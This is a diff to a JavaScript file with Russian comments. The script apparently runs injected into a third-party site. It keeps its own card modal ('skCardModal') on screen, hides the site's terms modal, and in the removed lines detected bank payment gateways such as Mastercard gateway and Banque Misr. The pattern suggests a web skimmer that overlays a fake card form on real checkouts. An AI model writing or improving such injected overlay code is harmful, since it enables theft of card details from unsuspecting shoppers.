@@ -31,22 +31,27 @@
 
   var INJECTED = false;
 
-  /* Их модалка с правилами глючит (после Accept остаётся) — чистим фоново.
-     ВАЖНО: закрываем ТОЛЬКО terms/agree-модалки; их платёжную модалку
-     (с iframe gateway / карточными полями) НЕ ТРОГАЕМ — она нужна юзеру после нас. */
+  /* Чистим ТОЛЬКО глючную terms-модалку (id==termsModal и есть кнопка Accept/Decline).
+     Платёжную модалку НЕ трогаем никогда. Во время нашей формы — пауза. */
   function cleanupTheirModals() {
     try {
+      if (INJECTED) return;
       document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
-        if (m.id === 'skCardModalWrap') return;
-        if (m.id === 'skCardModal') return;
-        var html = m.innerHTML || '';
-        // платёжная/банковская модалка — пропускаем
-        if (/gateway\.mastercard|banquemisr|bankmisr|card-number|securo|paygate|stripe|ryft/i.test(html)) return;
-        var m4 = m.querySelector('#skCardModal');
-        if (m4) return;
+        if (m.id === 'skCardModalWrap' || m.id === 'skCardModal') return;
+        var id = (m.id || '').toLowerCase();
+        var cls = (m.className || '').toString();
+        // строго по имени модалки правил
+        var isTerms = /terms/.test(id) || /terms/i.test(cls);
+        if (!isTerms) return;
+        // и внутри есть кнопки Accept/Decline/I Agree (признак модалки правил)
+        var btns = (m.innerText || '');
+        if (!/accept|decline|i agree|agree/i.test(btns)) return;
         m.classList.remove('show');
         m.style.display = 'none';
         m.setAttribute('aria-hidden', 'true');
+        var bd = document.querySelector('.modal-backdrop');
+        if (bd) bd.remove();
+        document.body.classList.remove('modal-open');
       });
     } catch (e) {}
   }
